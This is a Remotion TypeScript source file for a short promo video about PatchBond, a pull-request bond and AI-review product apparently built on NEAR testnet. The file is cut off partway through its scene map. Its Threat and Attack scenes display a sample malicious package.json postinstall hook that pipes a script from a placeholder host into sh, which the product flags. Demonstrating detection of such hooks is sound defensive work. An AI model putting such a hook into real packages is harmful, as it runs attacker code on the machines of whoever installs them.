// The short cut (~57 s): beat-synced to an original 124 BPM track (gen-music.ts), narrated by a
// neural voice (gen-voice.mjs), with burned-in captions for muted autoplay. Product shots are real
// recordings of the running app (record.ts); receipts are real testnet transactions (fetch-txs.ts).

import { loadFont } from "@remotion/google-fonts/Inter";
import { loadFont as loadMono } from "@remotion/google-fonts/JetBrainsMono";
import type { CSSProperties, ReactNode } from "react";
import { AbsoluteFill, Audio, Easing, Img, interpolate, OffthreadVideo, Sequence, spring, staticFile, useCurrentFrame, useVideoConfig } from "remotion";
import txData from "../public/txs.json";
import cut from "./cut.json";

const { fontFamily } = loadFont();
const { fontFamily: mono } = loadMono();
const C = { bg: "#0b0d10", panel: "#14171c", line: "#2a2f37", ink: "#eceae4", ink2: "#a3a6ad", faint: "#6b7079", brand: "#22c55e", warn: "#fbbf24", danger: "#f87171" };

const FPS = 30;
const BEAT = 60 / cut.bpm;
const BAR = BEAT * 4;
const f = (sec: number) => Math.round(sec * FPS);
const starts: Record<string, number> = {};
let acc = 0;
for (const s of cut.scenes) {
  starts[s.id] = acc;
  acc += s.bars * BAR;
}
export const SHORT_FRAMES = f(acc + 1.2);
const sceneFrames = (id: string) => f(cut.scenes.find((s) => s.id === id)!.bars * BAR);

// ---------- primitives ----------

function useBeat() {
  const frame = useCurrentFrame();
  const t = frame / FPS;
  return (t % BEAT) / BEAT; // 0 at each beat
}

function Backdrop({ hue = C.brand, intensity = 1 }: { hue?: string; intensity?: number }) {
  const frame = useCurrentFrame();
  const beat = useBeat();
  const pulse = 1 + 0.06 * Math.exp(-beat * 6) * intensity;
  return (
    <AbsoluteFill style={{ background: C.bg, overflow: "hidden" }}>
      <AbsoluteFill style={{ backgroundImage: "radial-gradient(rgba(236,234,228,.08) 1.5px, transparent 1.5px)", backgroundSize: "36px 36px", maskImage: "radial-gradient(ellipse 75% 65% at 50% 50%, #000 25%, transparent 100%)", transform: `translateY(${-(frame % 36)}px)` }} />
      <div style={{ position: "absolute", left: "50%", top: "45%", width: 1400, height: 900, marginLeft: -700, marginTop: -450, borderRadius: "50%", background: hue, opacity: 0.11 * intensity, filter: "blur(160px)", transform: `scale(${pulse})` }} />
    </AbsoluteFill>
  );
}

/** Enter with a quick whip: slide + blur, on the cut. */
function Whip({ children, from = 1 }: { children: ReactNode; from?: number }) {
  const frame = useCurrentFrame();
  const p = interpolate(frame, [0, 7], [0, 1], { extrapolateRight: "clamp", easing: Easing.out(Easing.cubic) });
  return <AbsoluteFill style={{ transform: `translateX(${(1 - p) * 140 * from}px)`, filter: `blur(${(1 - p) * 14}px)`, opacity: Math.min(1, p * 1.6) }}>{children}</AbsoluteFill>;
}

function Pop({ children, at = 0, style }: { children: ReactNode; at?: number; style?: CSSProperties }) {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();
  const p = spring({ frame: frame - at, fps, config: { damping: 13, stiffness: 190, mass: 0.7 } });
  return <div style={{ transform: `scale(${0.6 + 0.4 * p}) translateY(${(1 - p) * 24}px)`, opacity: Math.min(1, p * 1.5), filter: `blur(${(1 - Math.min(1, p)) * 10}px)`, ...style }}>{children}</div>;
}

/** Words land one per half-beat. `accent` words are green. */
function Kinetic({ words, accent = [], size = 120, startBeat = 0.3, style }: { words: string[]; accent?: number[]; size?: number; startBeat?: number; style?: CSSProperties }) {
  return (
    <div style={{ display: "flex", flexWrap: "wrap", gap: `0 ${size * 0.26}px`, fontSize: size, fontWeight: 800, letterSpacing: "-0.045em", lineHeight: 1.02, ...style }}>
      {words.map((w, i) => (
        <Pop key={i} at={f((startBeat + i * 0.5) * BEAT)}>
          <span style={{ color: accent.includes(i) ? C.brand : C.ink }}>{w}</span>
        </Pop>
      ))}
    </div>
  );
}

/** A recording with a camera move: from the full frame to a focus point and zoom. */
function Camera({ src, startSec, rate = 1, to, zoomFrom = 1, delay = 0.15, framed = false }: { src: string; startSec: number; rate?: number; to: { x: number; y: number; z: number }; zoomFrom?: number; delay?: number; framed?: boolean }) {
  const frame = useCurrentFrame();
  const { durationInFrames } = useVideoConfig();
  const p = interpolate(frame, [f(delay), Math.max(f(delay) + 1, durationInFrames * 0.7)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.inOut(Easing.cubic) });
  const z = zoomFrom + (to.z - zoomFrom) * p;
  const cx = 960 + (to.x - 960) * p;
  const cy = 540 + (to.y - 540) * p;
  const inner = (
    <div style={{ position: "absolute", width: 1920, height: 1080, left: 0, top: 0, transformOrigin: "0 0", transform: `translate(${960 - cx * z}px, ${540 - cy * z}px) scale(${z})` }}>
      <OffthreadVideo src={staticFile(`clips/${src}.webm`)} startFrom={f(startSec)} playbackRate={rate} muted style={{ width: 1920, height: 1080 }} />
    </div>
  );
  return framed ? <div style={{ position: "absolute", inset: 0, overflow: "hidden", borderRadius: 24 }}>{inner}</div> : <AbsoluteFill style={{ overflow: "hidden" }}>{inner}</AbsoluteFill>;
}

function Chip({ children, tone = C.brand, style }: { children: ReactNode; tone?: string; style?: CSSProperties }) {
  return (
    <div style={{ display: "inline-flex", alignItems: "center", gap: 12, padding: "14px 26px", borderRadius: 999, background: "rgba(11,13,16,.82)", border: `1.5px solid ${tone}55`, color: C.ink, fontSize: 30, fontWeight: 650, backdropFilter: "blur(12px)", boxShadow: `0 10px 40px -10px ${tone}66`, ...style }}>
      <span style={{ width: 10, height: 10, borderRadius: 5, background: tone, boxShadow: `0 0 12px ${tone}` }} />
      {children}
    </div>
  );
}

function Count({ to, at = 0, suffix = "" }: { to: number; at?: number; suffix?: string }) {
  const frame = useCurrentFrame();
  const v = interpolate(frame, [at, at + f(1.1)], [0, to], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.out(Easing.cubic) });
  return (
    <span style={{ fontVariantNumeric: "tabular-nums" }}>
      {Math.round(v)}
      {suffix}
    </span>
  );
}

/** Transparent wordmark: the mark plus "Patch" in ink and "Bond" in brand green. */
function Wordmark({ size = 150 }: { size?: number }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: size * 0.05 }}>
      {/* the mark's SVG has generous padding, so it's drawn larger and pulled in */}
      <Img src={staticFile("mark.svg")} style={{ width: size * 2, height: size * 2, margin: `0 ${-size * 0.3}px 0 ${-size * 0.45}px` }} />
      <div style={{ fontSize: size, fontWeight: 800, letterSpacing: "-0.04em", lineHeight: 1 }}>
        Patch<span style={{ color: C.brand }}>Bond</span>
      </div>
    </div>
  );
}

const Vignette = () => <AbsoluteFill style={{ background: "radial-gradient(ellipse 85% 80% at 50% 50%, transparent 55%, rgba(0,0,0,.55) 100%)", pointerEvents: "none" }} />;

// ---------- scenes ----------

function Hook() {
  const frame = useCurrentFrame();
  // A stream of PR cards flowing past — the flood.
  const cards = Array.from({ length: 22 }, (_, i) => i);
  return (
    <AbsoluteFill>
      <Backdrop intensity={0.6} />
      <AbsoluteFill style={{ opacity: 0.55 }}>
        {cards.map((i) => {
          const lane = i % 6;
          const speed = 9 + (i % 5) * 3;
          const x = ((i * 397 + frame * speed) % 2600) - 340;
          return (
            <div key={i} style={{ position: "absolute", left: x, top: 90 + lane * 165, padding: "12px 20px", borderRadius: 14, background: C.panel, border: `1px solid ${C.line}`, fontFamily: mono, fontSize: 22, color: C.faint, whiteSpace: "nowrap", filter: lane % 2 ? "blur(2px)" : undefined }}>
              PR #{4100 + i * 37} · <span style={{ color: i % 3 ? C.faint : C.danger }}>{["Improve everything", "Refactor codebase", "Fix security (critical!!)", "Update README", "Add AI features"][i % 5]}</span>
            </div>
          );
        })}
      </AbsoluteFill>
      <AbsoluteFill style={{ background: "radial-gradient(ellipse 60% 55% at 50% 50%, rgba(11,13,16,.92) 35%, transparent 80%)" }} />
      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
        <Kinetic words={["AI", "made", "sending", "free."]} accent={[3]} size={150} style={{ justifyContent: "center", maxWidth: 1500 }} />
      </AbsoluteFill>
    </AbsoluteFill>
  );
}

/** The cost of a PR — and the rare one that hides something worse (a backdoor in an install hook). */
function Threat() {
  const frame = useCurrentFrame();
  const reveal = interpolate(frame, [f(BEAT * 4.6), f(BEAT * 5.2)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
  return (
    <AbsoluteFill>
      <Backdrop hue={C.danger} intensity={0.8} />
      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
        <Kinetic words={["Every", "PR", "costs", "an", "hour."]} accent={[3, 4]} size={130} startBeat={0.1} style={{ justifyContent: "center", maxWidth: 1600 }} />
        <Pop at={f(BEAT * 3.6)} style={{ marginTop: 60 }}>
          <div style={{ width: 1180, background: C.panel, border: `1.5px solid ${C.line}`, borderRadius: 24, overflow: "hidden", boxShadow: "0 40px 120px -30px rgba(0,0,0,.9)" }}>
            <div style={{ padding: "18px 28px", fontSize: 30, fontWeight: 650 }}>
              ✨ Fix typo in docs <span style={{ color: C.faint, fontWeight: 500, fontSize: 24 }}>· @friendly-dev · "happy to help!"</span>
            </div>
            <div style={{ fontFamily: mono, fontSize: 26, padding: "10px 28px 18px", color: C.ink2, borderTop: `1px solid ${C.line}` }}>
              <div>- Teh queue runs jobs.</div>
              <div>+ The queue runs jobs.</div>
              <div style={{ color: C.danger, opacity: reveal, background: `rgba(248,113,113,${0.12 * reveal})` }}>+ "postinstall": "curl -s https://…/p.sh | sh"</div>
            </div>
          </div>
        </Pop>
        <div style={{ marginTop: 26, opacity: reveal }}>
          <Chip tone={C.danger}>…and a few hide something worse</Chip>
        </div>
      </AbsoluteFill>
    </AbsoluteFill>
  );
}

function Maintainer() {
  const stats = [
    { n: 122, label: "contributors" },
    { n: 571, label: "pull requests" },
    { n: 88, label: "closed unmerged" },
  ];
  return (
    <AbsoluteFill>
      <Backdrop intensity={0.8} />
      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
        <Pop>
          <div style={{ fontSize: 28, fontWeight: 700, letterSpacing: "0.24em", color: C.faint, textTransform: "uppercase", textAlign: "center" }}>
            One maintainer · Sanctifier · Stellar Soroban
          </div>
        </Pop>
        <div style={{ display: "flex", gap: 90, marginTop: 50 }}>
          {stats.map((s, i) => (
            <Pop key={s.label} at={f(BEAT * (0.5 + i))}>
              <div style={{ textAlign: "center" }}>
                <div style={{ fontSize: 170, fontWeight: 800, letterSpacing: "-0.05em", color: i === 2 ? C.danger : C.ink, lineHeight: 1 }}>
                  <Count to={s.n} at={f(BEAT * (0.5 + i))} />
                </div>
                <div style={{ fontSize: 32, color: C.ink2, marginTop: 10 }}>{s.label}</div>
              </div>
            </Pop>
          ))}
        </div>
        <Pop at={f(BEAT * 4.4)} style={{ marginTop: 60 }}>
          <div style={{ display: "flex", gap: 20 }}>
            <Chip tone={C.warn}>PRs for issues nobody assigned</Chip>
            <Chip tone={C.warn}>claims the code doesn't back up</Chip>
          </div>
        </Pop>
      </AbsoluteFill>
    </AbsoluteFill>
  );
}

function Logo() {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();
  const slam = spring({ frame, fps, config: { damping: 9, stiffness: 220 } });
  const flash = interpolate(frame, [0, 6], [0.85, 0], { extrapolateRight: "clamp" });
  const ring = interpolate(frame, [0, 22], [0, 1], { extrapolateRight: "clamp", easing: Easing.out(Easing.cubic) });
  return (
    <AbsoluteFill>
      <Backdrop intensity={1.6} />
      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
        <div style={{ position: "absolute", width: 600, height: 600, borderRadius: "50%", border: `4px solid ${C.brand}`, transform: `scale(${0.4 + ring * 2.4})`, opacity: 1 - ring }} />
        <div style={{ transform: `scale(${1.35 - 0.35 * slam})`, opacity: Math.min(1, slam * 2) }}>
          <Wordmark size={170} />
        </div>
        <Pop at={8} style={{ marginTop: 34 }}>
          <div style={{ fontSize: 46, fontWeight: 650, color: C.ink2 }}>
            A market for <span style={{ color: C.brand }}>maintainer attention</span>
          </div>
        </Pop>
      </AbsoluteFill>
      <AbsoluteFill style={{ background: "#fff", opacity: flash }} />
    </AbsoluteFill>
  );
}

function Bond() {
  return (
    <AbsoluteFill>
      <Whip>
        <Camera src="hero" startSec={2.5} rate={1.35} to={{ x: 1265, y: 450, z: 1.95 }} />
        <Vignette />
        <Pop at={f(BEAT * 1.5)} style={{ position: "absolute", left: 90, bottom: 190 }}>
          <Chip>Refundable bond on every outside PR</Chip>
        </Pop>
      </Whip>
    </AbsoluteFill>
  );
}

function Spam() {
  return (
    <AbsoluteFill>
      <Whip>
        <Camera src="spam" startSec={3.7} rate={1.25} to={{ x: 1212, y: 330, z: 1.75 }} />
        <Vignette />
        <Pop at={f(BEAT * 3.6)} style={{ position: "absolute", left: 90, bottom: 180 }}>
          <div style={{ background: "rgba(11,13,16,.85)", border: `1.5px solid ${C.danger}66`, borderRadius: 28, padding: "24px 36px", backdropFilter: "blur(12px)" }}>
            <div style={{ fontSize: 96, fontWeight: 800, color: C.danger, letterSpacing: "-0.04em", lineHeight: 1 }}>+12.5%</div>
            <div style={{ fontSize: 30, color: C.ink2, marginTop: 8 }}>for every extra PR in the queue</div>
          </div>
        </Pop>
      </Whip>
    </AbsoluteFill>
  );
}

function Judge() {
  const half = f(BAR);
  const tags = [
    ["CI", C.brand],
    ["Invented code", C.danger],
    ["Claims vs diff", C.warn],
    ["Malicious code", C.danger],
    ["Prompt injection", C.danger],
  ] as const;
  return (
    <AbsoluteFill>
      <Sequence durationInFrames={half}>
        <Whip>
          <Camera src="judge" startSec={4.1} rate={2} to={{ x: 960, y: 300, z: 1.45 }} />
          <Vignette />
        </Whip>
      </Sequence>
      <Sequence from={half}>
        <Whip>
          <Camera src="judge" startSec={17.8} rate={1} zoomFrom={1.15} to={{ x: 840, y: 340, z: 1.6 }} delay={0} />
          <Vignette />
          <div style={{ position: "absolute", right: 80, top: 160, display: "flex", flexDirection: "column", gap: 16, alignItems: "flex-end" }}>
            {tags.map(([t, tone], i) => (
              <Pop key={t} at={f(BEAT * (0.2 + i * 0.4))}>
                <Chip tone={tone}>{t}</Chip>
              </Pop>
            ))}
          </div>
        </Whip>
      </Sequence>
    </AbsoluteFill>
  );
}

function Verify() {
  const frame = useCurrentFrame();
  const stamp = spring({ frame: frame - f(BEAT * 1.4), fps: FPS, config: { damping: 10, stiffness: 200 } });
  return (
    <AbsoluteFill>
      <Whip>
        <Camera src="judge" startSec={25.4} rate={1.15} zoomFrom={1.3} to={{ x: 817, y: 470, z: 1.62 }} delay={0} />
        <Vignette />
        <Pop at={2} style={{ position: "absolute", left: 90, bottom: 170 }}>
          <Chip>
            <b>LIVE</b> · signed in a TEE on NEAR AI Cloud · <span style={{ fontFamily: mono, fontSize: 24, color: C.ink2 }}>glm-5.3-flash</span>
          </Chip>
        </Pop>
        <div style={{ position: "absolute", right: 110, top: 120, transform: `rotate(-8deg) scale(${0.3 + 0.7 * stamp})`, opacity: Math.min(1, stamp * 1.4) }}>
          <div style={{ border: `6px solid ${C.brand}`, color: C.brand, borderRadius: 22, padding: "18px 34px", fontSize: 54, fontWeight: 900, letterSpacing: "0.06em", background: "rgba(11,13,16,.8)", boxShadow: `0 0 60px ${C.brand}55` }}>
            ✓ VERIFIED
            <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 4 }}>in your browser · no trust needed</div>
          </div>
        </div>
      </Whip>
    </AbsoluteFill>
  );
}

/** A poisoned install hook in a diff: the scan flags it and the forfeit stamps down. */
function Attack() {
  const frame = useCurrentFrame();
  const flag = interpolate(frame, [f(BEAT * 0.9), f(BEAT * 1.3)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
  const stamp = spring({ frame: frame - f(BEAT * 2.1), fps: FPS, config: { damping: 9, stiffness: 240 } });
  const lines: [string, string][] = [
    [" ", '  "scripts": {'],
    [" ", '    "build": "tsc -p .",'],
    ["+", '    "postinstall": "curl -s https://x.example/p.sh | sh",'],
    [" ", "  },"],
  ];
  return (
    <AbsoluteFill>
      <Backdrop hue={C.danger} intensity={0.9} />
      <Whip>
        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
          <div style={{ width: 1400, background: C.panel, border: `1.5px solid ${C.line}`, borderRadius: 26, overflow: "hidden", boxShadow: "0 40px 120px -30px rgba(0,0,0,.9)" }}>
            <div style={{ padding: "18px 30px", borderBottom: `1px solid ${C.line}`, fontFamily: mono, fontSize: 24, color: C.faint }}>package.json · constructed test PR, judged by the real model</div>
            <div style={{ padding: "22px 0", fontFamily: mono, fontSize: 34, lineHeight: 1.75 }}>
              {lines.map(([sign, text], i) => {
                const bad = sign === "+";
                return (
                  <div key={i} style={{ padding: "0 30px", whiteSpace: "pre", color: bad ? C.ink : C.ink2, background: bad ? `rgba(248,113,113,${0.08 + 0.17 * flag})` : undefined, boxShadow: bad ? `inset 6px 0 0 rgba(248,113,113,${flag})` : undefined }}>
                    <span style={{ color: bad ? C.danger : C.faint }}>{sign} </span>
                    {text}
                  </div>
                );
              })}
            </div>
          </div>
          <div style={{ display: "flex", gap: 18, marginTop: 34, opacity: flag }}>
            <Chip tone={C.danger}>install hook that runs downloaded code</Chip>
            <Chip tone={C.danger}>claims work the diff doesn't contain</Chip>
          </div>
          <Pop at={f(BEAT * 4)} style={{ marginTop: 30, maxWidth: 1400 }}>
            <div style={{ fontSize: 30, color: C.ink2, lineHeight: 1.45, textAlign: "center", fontStyle: "italic" }}>
              “Adds a postinstall hook that pipes a remote script into a shell… none of the claimed work.”
              <div style={{ fontStyle: "normal", fontFamily: mono, fontSize: 20, color: C.faint, marginTop: 10 }}>the model's own words · signature 0x3b75…fa0c · checked on-chain</div>
            </div>
          </Pop>
        </AbsoluteFill>
        <div style={{ position: "absolute", right: 150, top: 120, transform: `rotate(7deg) scale(${0.3 + 0.7 * stamp})`, opacity: Math.min(1, stamp * 1.4) }}>
          <div style={{ border: `6px solid ${C.danger}`, color: C.danger, borderRadius: 22, padding: "16px 32px", fontSize: 56, fontWeight: 900, letterSpacing: "0.06em", background: "rgba(11,13,16,.85)", boxShadow: `0 0 60px ${C.danger}55` }}>
            FORFEITED
            <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 2 }}>signed by NEAR AI's enclave · 0.99</div>
          </div>
        </div>
      </Whip>
    </AbsoluteFill>
  );
}

/** Contributors are protected too: a maintainer's forfeit is a proposal, disputable for free. */
function Fair() {
  const steps = [
    { n: "48 h", t: "a maintainer's forfeit is only a proposal", tone: C.warn },
    { n: "$0", t: "to dispute it — a stronger AI re-judges", tone: C.brand },
    { n: "+1 bond", t: "paid to you from their vault if they were wrong", tone: C.brand },
  ];
  return (
    <AbsoluteFill>
      <Backdrop intensity={1} />
      <Whip>
        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
          <Kinetic words={["Maintainers", "can't", "steal", "it", "either."]} accent={[2]} size={104} startBeat={0.1} style={{ justifyContent: "center", maxWidth: 1600 }} />
          <div style={{ display: "flex", gap: 28, marginTop: 70 }}>
            {steps.map((x, i) => (
              <Pop key={x.n} at={f(BEAT * (2.6 + i * 0.7))}>
                <div style={{ width: 470, background: C.panel, border: `1.5px solid ${x.tone}44`, borderRadius: 26, padding: "30px 32px", boxShadow: `0 30px 80px -30px ${x.tone}55` }}>
                  <div style={{ fontSize: 76, fontWeight: 800, letterSpacing: "-0.04em", color: x.tone, lineHeight: 1 }}>{x.n}</div>
                  <div style={{ fontSize: 28, color: C.ink2, marginTop: 14, lineHeight: 1.35 }}>{x.t}</div>
                </div>
              </Pop>
            ))}
          </div>
        </AbsoluteFill>
      </Whip>
    </AbsoluteFill>
  );
}

/** OutLayer: the contract has the PR judged inside an Intel TDX enclave; our server isn't in the path. */
function Outlayer() {
  const frame = useCurrentFrame();
  const strike = interpolate(frame, [f(BEAT * 4.4), f(BEAT * 5)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
  const box = (title: string, sub: string, tone: string) => (
    <div style={{ width: 360, background: C.panel, border: `1.5px solid ${tone}55`, borderRadius: 24, padding: "26px 28px", boxShadow: `0 30px 80px -30px ${tone}66` }}>
      <div style={{ fontSize: 36, fontWeight: 800, letterSpacing: "-0.02em" }}>{title}</div>
      <div style={{ fontSize: 22, color: C.ink2, marginTop: 8, lineHeight: 1.35 }}>{sub}</div>
    </div>
  );
  const arrow = (at: number) => (
    <Pop at={f(BEAT * at)}>
      <div style={{ fontSize: 56, color: C.brand, fontWeight: 800 }}>→</div>
    </Pop>
  );
  return (
    <AbsoluteFill>
      <Backdrop intensity={1.1} />
      <Whip>
        <div style={{ position: "absolute", left: 110, top: 100 }}>
          <Pop>
            <div style={{ fontSize: 26, fontWeight: 700, letterSpacing: "0.24em", color: C.brand }}>OUTLAYER · INTEL TDX · LIVE ON TESTNET</div>
          </Pop>
          <Pop at={3}>
            <div style={{ fontSize: 70, fontWeight: 800, letterSpacing: "-0.04em", marginTop: 10 }}>Judged in a sealed enclave.</div>
          </Pop>
        </div>
        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center", top: 120 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 26 }}>
            <Pop at={f(BEAT * 0.8)}>{box("Contract", "anyone asks: judge_in_tee", C.brand)}</Pop>
            {arrow(1.4)}
            <Pop at={f(BEAT * 1.8)}>{box("Enclave", "reads GitHub itself, asks NEAR AI", C.brand)}</Pop>
            {arrow(2.4)}
            <Pop at={f(BEAT * 2.8)}>{box("Contract", "checks NEAR AI's signature, settles", C.brand)}</Pop>
          </div>
          <Pop at={f(BEAT * 3.8)} style={{ marginTop: 50 }}>
            <div style={{ position: "relative", display: "inline-block", padding: "16px 34px", borderRadius: 18, border: `1.5px dashed ${C.faint}`, color: C.faint, fontSize: 34, fontWeight: 700 }}>
              PatchBond's server
              <div style={{ position: "absolute", left: -10, right: -10, top: "50%", height: 5, background: C.danger, transformOrigin: "left", transform: `scaleX(${strike})`, boxShadow: `0 0 18px ${C.danger}` }} />
            </div>
            <span style={{ fontSize: 32, color: C.ink2, marginLeft: 24, opacity: strike }}>not in the loop</span>
          </Pop>
          <Pop at={f(BEAT * 5.6)} style={{ marginTop: 34 }}>
            <Chip>tx GTZM613J… · 24.5 s in the enclave · signer recovered on-chain</Chip>
          </Pop>
        </AbsoluteFill>
      </Whip>
    </AbsoluteFill>
  );
}

/** nearcore: what PatchBond did on NEAR's own core repo. */
function Nearcore() {
  const stats = [
    { n: 186, label: "open PRs", tone: C.ink },
    { n: 20, label: "from strangers, judged", tone: C.ink },
    { n: 0, label: "honest PRs forfeited", tone: C.brand },
  ];
  return (
    <AbsoluteFill>
      <Backdrop intensity={0.9} />
      <Whip>
        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
          <Pop>
            <div style={{ fontSize: 28, fontWeight: 700, letterSpacing: "0.24em", color: C.faint, textTransform: "uppercase" }}>NEAR's own core repo · near/nearcore</div>
          </Pop>
          <div style={{ display: "flex", gap: 90, marginTop: 50 }}>
            {stats.map((x, i) => (
              <Pop key={x.label} at={f(BEAT * (0.5 + i * 0.9))}>
                <div style={{ textAlign: "center" }}>
                  <div style={{ fontSize: 170, fontWeight: 800, letterSpacing: "-0.05em", color: x.tone, lineHeight: 1 }}>
                    <Count to={x.n} at={f(BEAT * (0.5 + i * 0.9))} />
                  </div>
                  <div style={{ fontSize: 32, color: C.ink2, marginTop: 10 }}>{x.label}</div>
                </div>
              </Pop>
            ))}
          </div>
          <Pop at={f(BEAT * 4.4)} style={{ marginTop: 56 }}>
            <div style={{ display: "flex", gap: 20 }}>
              <Chip>13 refunded automatically</Chip>
              <Chip tone={C.warn}>7 to a maintainer</Chip>
              <Chip tone={C.ink2}>$0.0074 for all 20</Chip>
            </div>
          </Pop>
        </AbsoluteFill>
      </Whip>
    </AbsoluteFill>
  );
}

const tx = (id: string) => txData.txs.find((t) => t.id === id)!;
const usd = (v: unknown) => `$${(Number(v) / 1e6).toFixed(2)}`;

function Chain() {
  const forfeit = tx("forfeit").events.find((e) => e.event === "settle")!.data as unknown as Record<string, string>;
  const cards = [
    { t: tx("gasless"), title: "Gasless bond", line: "contributor spent 0 NEAR — the relayer paid", tone: C.brand },
    { t: tx("forfeit"), title: "Slop forfeited", line: `${usd(forfeit.to_vault)} to the repo · ${usd(forfeit.to_treasury)} treasury`, tone: C.warn },
    { t: tx("agent"), title: "Agent pays via MCP", line: "passport + deposit · key can only pay bonds", tone: C.brand },
  ];
  return (
    <AbsoluteFill>
      <Backdrop intensity={0.9} />
      <Whip>
        <div style={{ position: "absolute", left: 110, top: 110 }}>
          <Pop>
            <div style={{ fontSize: 26, fontWeight: 700, letterSpacing: "0.24em", color: C.brand }}>REAL TRANSACTIONS · NEAR TESTNET</div>
          </Pop>
          <Pop at={3}>
            <div style={{ fontSize: 76, fontWeight: 800, letterSpacing: "-0.04em", marginTop: 10 }}>The money moves on-chain.</div>
          </Pop>
        </div>
        <div style={{ position: "absolute", left: 110, right: 110, top: 360, display: "flex", gap: 28 }}>
          {cards.map((c, i) => (
            <Pop key={c.title} at={f(BEAT * (0.6 + i * 0.75))} style={{ flex: 1 }}>
              <div style={{ background: C.panel, border: `1.5px solid ${c.tone}44`, borderRadius: 26, padding: "34px 34px", height: 400, boxShadow: `0 30px 80px -30px ${c.tone}55` }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span style={{ fontSize: 22, color: c.tone, fontWeight: 800, letterSpacing: "0.1em" }}>✓ SUCCESS</span>
                  <span style={{ fontFamily: mono, fontSize: 18, color: C.faint }}>{c.t.action}</span>
                </div>
                <div style={{ fontSize: 44, fontWeight: 800, marginTop: 24, letterSpacing: "-0.03em" }}>{c.title}</div>
                <div style={{ fontSize: 26, color: C.ink2, marginTop: 14, lineHeight: 1.4 }}>{c.line}</div>
                <div style={{ fontFamily: mono, fontSize: 19, color: C.faint, marginTop: 34 }}>tx {c.t.hash.slice(0, 22)}…</div>
                <div style={{ fontFamily: mono, fontSize: 18, color: C.faint, marginTop: 8 }}>
                  {c.t.events.map((e) => `${e.standard}.${e.event}`).join(" · ")}
                </div>
              </div>
            </Pop>
          ))}
        </div>
      </Whip>
    </AbsoluteFill>
  );
}

function Near() {
  const items = ["NEAR AI Cloud · TEE", "OutLayer · Intel TDX", "Rust contract", "USDC & wNEAR", "Function-call keys", "Meta tx · NEP-366", "NEP-413 signatures", "NEAR Intents", "Sputnik DAO"];
  return (
    <AbsoluteFill>
      <Backdrop intensity={1.1} />
      <Whip>
        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
          <Pop>
            <div style={{ fontSize: 112, fontWeight: 800, letterSpacing: "-0.045em" }}>
              Built on <span style={{ color: C.brand }}>NEAR.</span>
            </div>
          </Pop>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 18, justifyContent: "center", maxWidth: 1500, marginTop: 56 }}>
            {items.map((t, i) => (
              <Pop key={t} at={f(BEAT * (0.8 + i * 0.25))}>
                <Chip style={{ fontSize: 28 }}>{t}</Chip>
              </Pop>
            ))}
          </div>
        </AbsoluteFill>
      </Whip>
    </AbsoluteFill>
  );
}

function Close() {
  return (
    <AbsoluteFill>
      <Backdrop intensity={1.3} />
      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center", textAlign: "center" }}>
        <Pop>
          <div style={{ fontSize: 96, fontWeight: 800, letterSpacing: "-0.045em", lineHeight: 1.05 }}>Real work gets its bond back.</div>
        </Pop>
        <Pop at={f(BEAT * 2)}>
          <div style={{ fontSize: 96, fontWeight: 800, letterSpacing: "-0.045em", lineHeight: 1.05, color: C.brand }}>Slop pays the maintainer.</div>
        </Pop>
        <Pop at={f(BEAT * 5)} style={{ marginTop: 70 }}>
          <Wordmark size={92} />
        </Pop>
        <Pop at={f(BEAT * 6.5)} style={{ marginTop: 26 }}>
          <div style={{ fontFamily: mono, fontSize: 32, color: C.ink2 }}>github.com/PatchBond/patchbond</div>
          <div style={{ fontSize: 22, color: C.faint, marginTop: 12 }}>Live on NEAR testnet · judged in NEAR AI & OutLayer enclaves · MIT · No token</div>
        </Pop>
      </AbsoluteFill>
    </AbsoluteFill>
  );
}

// ---------- captions (for muted autoplay) and progress ----------

function Captions() {
  const frame = useCurrentFrame();
  const t = frame / FPS;
  const lines = cut.lines.map((l, i) => {
    const start = starts[l.scene]! + l.at;
    const scene = cut.scenes.find((s) => s.id === l.scene)!;
    return { i, text: l.text.replace(/A\.I\./g, "AI").replace(/C\.I\./g, "CI"), start, end: starts[l.scene]! + scene.bars * BAR - 0.05 };
  });
  const cur = lines.find((l) => t >= l.start && t < l.end);
  if (!cur) return null;
  const local = t - cur.start;
  const p = Math.min(1, local / 0.18);
  return (
    <div style={{ position: "absolute", left: 0, right: 0, bottom: 64, display: "flex", justifyContent: "center", pointerEvents: "none" }}>
      <div key={cur.i} style={{ background: "rgba(0,0,0,.72)", color: "#fff", fontSize: 40, fontWeight: 650, padding: "12px 28px", borderRadius: 16, letterSpacing: "-0.01em", opacity: p, transform: `translateY(${(1 - p) * 10}px)`, maxWidth: 1500, textAlign: "center" }}>
        {cur.text}
      </div>
    </div>
  );
}

function Progress() {
  const frame = useCurrentFrame();
  const { durationInFrames } = useVideoConfig();
  return <div style={{ position: "absolute", left: 0, bottom: 0, height: 6, width: `${(frame / durationInFrames) * 100}%`, background: C.brand, boxShadow: `0 0 16px ${C.brand}` }} />;
}

const SCENES: Record<string, () => ReactNode> = {
  hook: () => <Hook />,
  threat: () => <Threat />,
  maintainer: () => <Maintainer />,
  logo: () => <Logo />,
  bond: () => <Bond />,
  spam: () => <Spam />,
  judge: () => <Judge />,
  attack: () => <Attack />,
  verify: () => <Verify />,
  outlayer: () => <Outlayer />,
  fair: () => <Fair />,
  nearcore: () => <Nearcore />,
